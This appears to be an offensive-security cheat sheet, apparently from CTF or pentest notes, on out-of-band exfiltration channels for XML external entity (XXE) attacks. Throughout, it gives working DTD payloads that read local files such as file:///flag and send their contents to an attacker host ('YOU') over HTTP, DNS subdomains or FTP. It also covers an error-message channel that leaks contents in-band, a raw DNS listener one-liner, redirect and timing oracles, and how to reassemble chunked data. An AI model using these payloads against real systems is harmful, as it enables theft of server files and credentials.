# OOB Channels — where the exfil lands

## The channels ranked — by reliability

1. **HTTP query/path** — `http://YOU/?d=%f;` — full content, easy listener
2. **DNS subdomain** — `http://%f;.YOU/` — short content, needs DNS listener
3. **FTP command** — `ftp://YOU/%f;` — legacy parsers
4. **Error-message URI** — `file:///nonexistent/%f;` — in-band error channel
5. **Redirect Location** — if the app follows a redirect built from content
6. **Email header/body** — `mailto:` — niche
7. **The `?wsdl`/schema fetch** — the fetched doc logs your content

## HTTP — the workhorse

```
<!ENTITY % w "<!ENTITY s SYSTEM 'http://YOU:8000/?d=%f;'>">
```

`oob_listener.py serve --port 8000 --log` — the `hits` output parses
query+path — the exfil lands in the request line + headers.

The `User-Agent`/`Referer` also land in the log — fingerprint the
fetcher: `Java/1.8`, `libwww-perl`, `Apache-HttpClient`, `curl/7.x`,
`Python-urllib` — `fetcher-fingerprint`-style read.

## DNS — when HTTP egress dies

`http://%f;.collab.YOU/` — the parser must RESOLVE the hostname before
fetching — the DNS query carries `%f` as a label — UDP 53 egress often
survives when TCP-80 doesn't. `dnsbin`/`dnschef`/`interactsh`/a raw
`:53` listener.

```
python3 -c "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.bind(('',53));print(s.recvfrom(1024))"
```

## FTP — `ftp://YOU/%f;`

The parser opens a control connection — `%f` lands in the `USER`/`RETR`
command. Raw socket listener captures it. Java/libxml2 FTP support.

## The error-channel — in-band, no listener

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % e "<!ENTITY &#37; err SYSTEM 'file:///nonexist/%f;'>">
%e;
%err;
```

`%err;` resolves `file:///nonexist/<content>` — `FileNotFoundException`
/`no such file` carries the full URI in-band — the "exfil" lands in the
HTTP response, not your listener. `error-based.md`.

## The redirect channel — `Location:`-leak

If the app follows a 3xx after your entity fetch — `http://YOU/redir`
that 302s to `http://YOU/leak?d=...` — the redirect hop re-sends —
multi-hop exfil. `redirect` chains.

## The canary — prove the hit is yours

`oob_listener.py canary --base http://YOU/` — a unique token embedded
in the URL — `hits` output filtered by it — kills the "that was a
scanner" doubt.

## The multi-hit sequencing — reconstruct the file

A multi-line file may arrive as multiple hits (one per line via a
wrap-DTD loop) or chunked — reassemble in order, dedupe, strip the
canary.

## The "the listener saw nothing but the error did" — error-channel fallback

Egress dead → in-band error channel still works IF the parser's error
echoes the failed URI — `denied-conditions.md` distinguishes
"fetch-failed" (channel dead, mechanism live) from "parser-refused"
(both dead).

## Timing-channel — the last resort

A param-entity fetch that takes measurable time = an oracle — a
conditional-fetch DTD can leak bits via response timing — slow, rare,
real. `<!ENTITY % c SYSTEM "<!ENTITY s SYSTEM 'http://YOU/%f;'>">` with
a fetch-or-not conditional on the file's first byte — the timing
oracle.
